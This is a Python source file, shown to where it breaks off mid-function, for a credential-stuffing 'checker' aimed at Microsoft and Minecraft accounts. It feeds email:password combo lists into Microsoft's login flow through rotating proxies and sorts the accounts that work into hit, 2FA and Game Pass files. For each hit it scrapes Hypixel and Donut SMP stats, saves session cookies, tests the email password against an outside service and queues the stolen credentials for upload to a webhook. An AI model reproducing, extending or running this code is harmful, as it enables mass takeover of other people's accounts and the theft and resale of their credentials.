import discord
from discord.ext import commands, tasks
import asyncio
import threading
import queue
import time
from datetime import datetime
import os
from dotenv import load_dotenv
import requests, re, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar
import shutil

# Linux-specific imports
try:
    from colorama import Fore
    colorama_available = True
except ImportError:
    colorama_available = False
    # Create basic color class for Linux
    class Fore:
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTRED_EX = '\033[91m'

# Linux console utils replacement
class LinuxUtils:
    @staticmethod
    def set_title(title):
        # For Linux terminals
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

# Use Linux utils instead of console.utils
utils = LinuxUtils()

# Linux file dialog replacement
class LinuxFileDialog:
    @staticmethod
    def askopenfile(**kwargs):
        filepath = input("Enter the full path to your file: ")
        if os.path.exists(filepath):
            return type('FileObj', (), {'name': filepath})()
        return None

filedialog = LinuxFileDialog()

# Minecraft imports (you'll need to install these dependencies)
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Warning: Minecraft networking library not available. Ban checking will be disabled.")

logo = Fore.YELLOW+'''
\n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
unbanned, banned_count = 0, 0
session_webhook_url = None
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Access control system
AUTHORIZED_USERS = set()  # Set of authorized Discord user IDs
OWNER_ID = None  # Will be loaded from .env
hits_queue = []  # Queue for storing hits to upload
banned_hits_queue = []  # Queue for banned hits
unbanned_hits_queue = []  # Queue for unbanned hits

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None
        # Donut SMP fields
        self.donut_banned = None
        self.donut_ban_reason = None
        self.donut_time_left = None
        self.donut_ban_id = None
        # Donut SMP stats fields
        self.donut_playtime = None
        self.donut_coins = None
        self.donut_kills = None
        self.donut_deaths = None
        self.donut_kdr = None
        self.donut_level = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        # Add Donut SMP information
        if config.get('donutsmp') is True:
            if self.donut_banned != None: 
                message+=f"\n<a:emoji_10:1450903257554620570> Donut SMP Banned: {self.donut_banned}"
                if self.donut_ban_reason != None: message+=f"\n<a:emoji_10:1450904133728206879> Ban Reason: {self.donut_ban_reason}"
                if self.donut_time_left != None: message+=f"\n<a:emoji_10:1450904133728206879> Time Left: {self.donut_time_left}"
                if self.donut_ban_id != None: message+=f"\n<:emoji_11:1450904476247392357> Ban ID: {self.donut_ban_id}"
            if self.donut_playtime != None: message+=f"\n<a:emoji_10:1450903257554620570> Donut Playtime: {self.donut_playtime}"
            if self.donut_coins != None: message+=f"\n<a:stolen_emoji_blaze:1450906435230765269> Donut Coins: {self.donut_coins}"
            if self.donut_level != None: message+=f"\n<a:stolen_emoji_blaze:1450906252711559466> Donut Level: {self.donut_level}"
            if self.donut_kills != None: message+=f"\n<a:stolen_emoji_blaze:1450906912433373246>  Donut Kills: {self.donut_kills}"
            if self.donut_deaths != None: message+=f"\n<:stolen_emoji_blaze:1450907096508797090>  Donut Deaths: {self.donut_deaths}"
            if self.donut_kdr != None: message+=f"\n<a:stolen_emoji_blaze:1450907292173336607> Donut K/D Ratio: {self.donut_kdr}"
        return message+"\n============================\n"

    def notify(self):
        global errors, session_webhook_url, banned_hits_queue, unbanned_hits_queue
        try:
            # Store hits in queue for scheduled upload - DO NOT upload instantly
            hit_data = {
                'email': self.email,
                'password': self.password,
                'name': self.name,
                'banned': str(self.banned),
                'type': self.type,
                'timestamp': datetime.now().isoformat(),
                'capes': self.capes,
                'hypixl': self.hypixl,
                'level': self.level,
                'firstlogin': self.firstlogin,
                'lastlogin': self.lastlogin,
                'cape': self.cape,
                'access': self.access,
                'sbcoins': self.sbcoins,
                'bwstars': self.bwstars,
                'namechanged': self.namechanged,
                'lastchanged': self.lastchanged,
                'uuid': self.uuid,
                # Donut SMP data
                'donut_banned': self.donut_banned,
                'donut_ban_reason': self.donut_ban_reason,
                'donut_time_left': self.donut_time_left,
                'donut_ban_id': self.donut_ban_id,
                # Donut SMP stats
                'donut_playtime': self.donut_playtime,
                'donut_coins': self.donut_coins,
                'donut_level': self.donut_level,
                'donut_kills': self.donut_kills,
                'donut_deaths': self.donut_deaths,
                'donut_kdr': self.donut_kdr
            }
            
            # Queue the hit based on ban status
            if str(self.banned).lower() == "false":
                unbanned_hits_queue.append(hit_data)
            elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown":
                banned_hits_queue.append(hit_data)
            
            # DO NOT upload instantly - hits will be uploaded by scheduler
        except:
            pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(20)
                        Capture.namechange(self)
                except: pass
                tries+=1
                retries+=1

    def save_cookies(self, type):
        cfname = os.path.join(f'results/{fname}', 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)

    def donut_stats(self):
        """
        FIXED: Fetch Donut SMP player stats from donutstats.net
        
        Improvements:
        - Disabled proxies for direct connection (avoids Cloudflare issues)
        - Normalized username (case-safe)
        - Multiple fallback regex patterns
        - Safe logging on failures
        - Clear "Not Found" status when unavailable
        - Better error handling
        """
        if config.get('donutsmp') is True and self.name != 'N/A':
            try:
                # Normalize username - case insensitive
                normalized_username = self.name.lower()
                
                # Build URL with normalized username
                url = f"https://www.donutstats.net/player/{normalized_username}"
                
                # Enhanced headers to handle Cloudflare
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                # CRITICAL: Disable proxies for Donut stats requests only
                response = requests.get(url, headers=headers, proxies=None, timeout=15, verify=False, allow_redirects=True)
                
                if response.status_code == 200:
                    text = response.text
                    
                    # Check if player exists (common "not found" patterns)
                    if any(phrase in text.lower() for phrase in ['player not found', 'no player', 'does not exist', '404', 'not exist']):
                        print(f"[DONUT] Player {self.name} not found on Donut SMP")
                        self.donut_playtime = "Not Found"
                        self.donut_coins = "Not Found"
                        self.donut_level = "Not Found"
                        self.donut_kills = "Not Found"
                        self.donut_deaths = "Not Found"
                        self.donut_kdr = "Not Found"
                        return
                    
                    # Extract playtime - Multiple patterns for robustness
                    playtime_patterns = [
                        r'playtime[:\s]+([0-9,]+(?:\.[0-9]+)?)\s*(?:hours?|hrs?|h)',
                        r'play\s*time[:\s]+([0-9,]+(?:\.[0-9]+)?)\s*(?:hours?|hrs?|h)',
                        r'hours\s*played[:\s]+([0-9,]+(?:\.[0-9]+)?)',
                        r'time\s*played[:\s]+([0-9,]+(?:\.[0-9]+)?)\s*(?:hours?|hrs?|h)',
                        r'>playtime<[^>]+>([0-9,]+(?:\.[0-9]+)?)',  # HTML tag pattern
                    ]
                    
                    for pattern in playtime_patterns:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            self.donut_playtime = match.group(1).strip() + " hours"
                            print(f"[DONUT] Found playtime: {self.donut_playtime}")
                            break
                    
                    # Extract coins - Multiple patterns
                    coins_patterns = [
                        r'coins?[:\s]+\$?([0-9,]+)',
                        r'money[:\s]+\$?([0-9,]+)',
                        r'balance[:\s]+\$?([0-9,]+)',
                        r'cash[:\s]+\$?([0-9,]+)',
                        r'>coins?<[^>]+>([0-9,]+)',
                    ]
                    
                    for pattern in coins_patterns:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            self.donut_coins = match.group(1).strip()
                            print(f"[DONUT] Found coins: {self.donut_coins}")
                            break
                    
                    # Extract kills - Multiple patterns
                    kills_patterns = [
                        r'(?:player\s+)?kills?[:\s]+([0-9,]+)',
                        r'>kills?<[^>]+>([0-9,]+)',
                        r'kill\s*count[:\s]+([0-9,]+)',
                    ]
                    
                    for pattern in kills_patterns:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            self.donut_kills = match.group(1).strip()
                            print(f"[DONUT] Found kills: {self.donut_kills}")
                            break
                    
                    # Extract deaths - Multiple patterns
                    deaths_patterns = [
                        r'deaths?[:\s]+([0-9,]+)',
                        r'>deaths?<[^>]+>([0-9,]+)',
                        r'death\s*count[:\s]+([0-9,]+)',
                    ]
                    
                    for pattern in deaths_patterns:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            self.donut_deaths = match.group(1).strip()
                            print(f"[DONUT] Found deaths: {self.donut_deaths}")
                            break
                    
                    # Extract K/D ratio - Try direct extraction first
                    kdr_patterns = [
                        r'k/?d(?:\s*ratio)?[:\s]+([0-9]+\.?[0-9]*)',
                        r'kdr[:\s]+([0-9]+\.?[0-9]*)',
                        r'>k/?d<[^>]+>([0-9]+\.?[0-9]*)',
                    ]
                    
                    for pattern in kdr_patterns:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            self.donut_kdr = match.group(1).strip()
                            print(f"[DONUT] Found K/D: {self.donut_kdr}")
                            break
                    
                    # Calculate K/D if not found but kills/deaths available
                    if not self.donut_kdr and self.donut_kills and self.donut_deaths:
                        try:
                            kills = int(self.donut_kills.replace(',', ''))
                            deaths = int(self.donut_deaths.replace(',', ''))
                            if deaths > 0:
                                self.donut_kdr = f"{kills/deaths:.2f}"
                                print(f"[DONUT] Calculated K/D: {self.donut_kdr}")
                        except Exception as calc_err:
                            print(f"[DONUT] Could not calculate K/D: {calc_err}")
                    
                    # Extract level - Multiple patterns
                    level_patterns = [
                        r'level[:\s]+([0-9]+)',
                        r'lvl[:\s]+([0-9]+)',
                        r'>level<[^>]+>([0-9]+)',
                        r'player\s*level[:\s]+([0-9]+)',
                    ]
                    
                    for pattern in level_patterns:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            self.donut_level = match.group(1).strip()
                            print(f"[DONUT] Found level: {self.donut_level}")
                            break
                    
                    # Log if NO stats were found at all
                    if not any([self.donut_playtime, self.donut_coins, self.donut_kills, 
                               self.donut_deaths, self.donut_kdr, self.donut_level]):
                        print(f"[DONUT] WARNING: No stats extracted for {self.name} despite 200 OK")
                        print(f"[DONUT] Page content length: {len(text)} bytes")
                        # Mark all as "Not Found" for clarity
                        self.donut_playtime = "Not Found"
                        self.donut_coins = "Not Found"
                        self.donut_level = "Not Found"
                        self.donut_kills = "Not Found"
                        self.donut_deaths = "Not Found"
                        self.donut_kdr = "Not Found"
                    else:
                        print(f"[DONUT] Successfully extracted stats for {self.name}")
                        
                elif response.status_code == 404:
                    print(f"[DONUT] Player {self.name} - 404 Not Found")
                    self.donut_playtime = "Not Found"
                    self.donut_coins = "Not Found"
                    self.donut_level = "Not Found"
                    self.donut_kills = "Not Found"
                    self.donut_deaths = "Not Found"
                    self.donut_kdr = "Not Found"
                else:
                    print(f"[DONUT] Unexpected status code {response.status_code} for {self.name}")
                    
            except requests.exceptions.Timeout:
                print(f"[DONUT] Timeout fetching stats for {self.name}")
            except requests.exceptions.ConnectionError:
                print(f"[DONUT] Connection error for {self.name}")
            except Exception as e:
                print(f"[DONUT] Error fetching stats for {self.name}: {str(e)}")
                # Don't silently fail - log the error

    def donut_check(self):
        """Check Donut SMP ban status with improved error handling and clear status display"""
        if config.get('donutsmp') is True:
            if not minecraft_available:
                self.donut_banned = "<a:emoji_9:1450903287606804632> Unknown (Library not available)"
                return
            
            try:
                result = None
                disconnect_message = None
                
                auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
                auth_token.profile = Profile(id_=self.uuid, name=self.name)
                
                connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})
                
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    nonlocal result, disconnect_message
                    try:
                        msg = str(packet.json_data)
                    except Exception:
                        msg = ""
                    disconnect_message = msg
                    result = "banned"
                
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    nonlocal result
                    result = "unbanned"
                
                connection.connect()
                
                # Wait for result (max 10 seconds)
                c = 0
                while result is None and c < 1000:
                    time.sleep(0.01)
                    c += 1
                
                if result == "unbanned":
                    self.donut_banned = "<a:stolen_emoji_blaze:1450908885677248593> Not Banned (Unbanned)"
                elif result == "banned":
                    self.donut_banned = "<a:stolen_emoji_blaze:1450908986860634304> BANNED"
                    if disconnect_message:
                        clean = re.sub(r'§.', '', disconnect_message)
                        # Extract ban details
                        reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
                        self.donut_ban_reason = reason_match.group(1).strip() if reason_match else "Banned (unknown reason)"
                        
                        time_match = re.search(r'Time Left: ([^\n\\]+)', clean)
                        self.donut_time_left = time_match.group(1).strip() if time_match else "Permanent"
                        
                        banid_match = re.search(r'Ban ID: ([^\n\\]+)', clean)
                        self.donut_ban_id = banid_match.group(1).strip() if banid_match else "N/A"
                    else:
                        self.donut_ban_reason = "Banned (Check manually)"
                        self.donut_time_left = "Unknown"
                else:
                    self.donut_banned = "<a:stolen_emoji_blaze:1450909317434835108> Unknown (Connection timeout)"
                
                try:
                    connection.disconnect()
                except:
                    pass
            except LoginDisconnect as e:
                self.donut_banned = "<a:stolen_emoji_blaze:1450908986860634304> BANNED (Login rejected)"
                self.donut_ban_reason = str(e)
            except ConnectionError as e:
                self.donut_banned = "<a:emoji_9:1450903287606804632> Connection Error"
            except Exception as e:
                self.donut_banned = f"<a:emoji_9:1450903287606804632> Error: {str(e)[:50]}"

    def ban(self, session):
        global errors, unbanned, banned_count
        if config.get('hypixelban'):
            if not minecraft_available:
                self.banned = "Unknown (Library not available)"
                return
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            original_socket = socket.socket
            max_ban_retries = maxretries if maxretries > 0 else 3
            while tries < max_ban_retries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    global unbanned, banned_count
                    try:
                        data = json.loads(str(packet.json_data))
                        if "Suspicious activity" in str(data):
                            self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "temporarily banned" in str(data):
                            self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "You are permanently banned from this server!" in str(data):
                            self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "The Hypixel Alpha server is currently closed!" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "Failed cloning your SkyBlock data" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "kicked" in str(data).lower() or "disconnect" in str(data).lower():
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        else:
                            try:
                                self.banned = ''.join(item["text"] for item in data.get("extra", []))
                            except:
                                self.banned = str(data)
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                    except Exception as e:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    global unbanned
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                proxy_was_set = False
                connection_error = None
                try:
                    proxies_to_use = banproxies if len(banproxies) > 0 else proxylist
                    if len(proxies_to_use) > 0:
                        proxy = random.choice(proxies_to_use)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                        proxy_was_set = True
                    elif config.get('proxylessban') != True:
                        self.banned = "Unknown (No proxy)"
                        return
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        max_wait = 3000
                        while self.banned == None and c < max_wait:
                            time.sleep(.01)
                            c+=1
                        try:
                            connection.disconnect()
                        except:
                            pass
                    except Exception as conn_error:
                        connection_error = str(conn_error)
                    finally:
                        sys.stderr = original_stderr
                        if proxy_was_set:
                            socket.socket = original_socket
                            socks.set_default_proxy()
                except Exception as outer_error:
                    connection_error = str(outer_error)
                    if proxy_was_set:
                        socket.socket = original_socket
                        socks.set_default_proxy()
                if self.banned != None: 
                    break
                tries+=1
                if tries < max_ban_retries:
                    time.sleep(0.5)
            socket.socket = original_socket
            socks.set_default_proxy()
            if self.banned == None:
                self.banned = "False"
                with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                unbanned += 1
                try:
                    self.save_cookies('Unbanned')
                except:
                    pass

    def handle(self, session):
        global hits
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban(session)
            except: pass
            try: self.donut_check()
            except: pass
            try: self.donut_stats()  # Fetch donut SMP stats
            except: pass
        fullcapt = self.builder()
        if screen == "'2'": print(Fore.GREEN+fullcapt.replace('\n', ' | '))
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        open(f"results/{fname}/Capture.txt", 'a').write(fullcapt+"\n============================\n")
        self.notify()

class Login:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
def get_urlPost_sFTTag(session):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        session.proxies = getproxy()
        retries += 1
        tries += 1
    raise Exception("Failed to get authentication URL after max retries")

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxies = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxies = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=15)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                CAPTURE.handle(session)
                break
            elif r.status_code == 429:
                retries+=1
                session.proxies = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                loop_tries += 1
                continue
            else: break
        except:
            retries+=1
            session.proxies = getproxy()
            loop_tries += 1
            continue

def checkmc(session, email, password, token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    max_tries = maxretries if maxretries > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=15)
        except:
            retries += 1
            session.proxies = getproxy()
            loop_tries += 1
            continue
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
